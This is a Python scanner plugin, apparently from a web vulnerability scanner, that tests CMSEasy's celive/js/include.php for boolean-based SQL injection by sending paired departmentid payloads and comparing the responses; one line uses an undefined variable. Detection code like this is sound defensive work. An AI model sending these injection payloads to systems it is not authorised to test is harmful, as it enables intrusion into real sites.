#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u''
        detail=detail.encode('utf8')
        domain=ob['domain']
        #url="/celive/js/include.php?cmseasylive=1111&departmentid=0"
        url1="celive/js/include.php?cmseasylive=1111&departmentid=0%27and%20%271%27=%271"
        url2="celive/js/include.php?cmseasylive=1111&departmentid=0%27and%20%271%27=%272"
        geturl1="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url1)
        geturl2="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url2)
        response1,content1=requestUrl(http,geturl1,ob['task_id'],ob['domain_id'])
        response2,content2=requestUrl(http,geturl2,ob['task_id'],ob['domain_id'])
        if content1.find("online.gif")>=0 and content2.find("online.gif")<0:
            request = getRequest(geturl1)
            #request = getRequest(geturl1)
            response = getResponse(response)
            result.append(getRecord(ob,ob['scheme']+"://"+domain+ob['base_path'],ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:CMSeasySQLINJECTION.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:CMSeasySQLINJECTION.py, run_domain function :" + str(e))
    return result
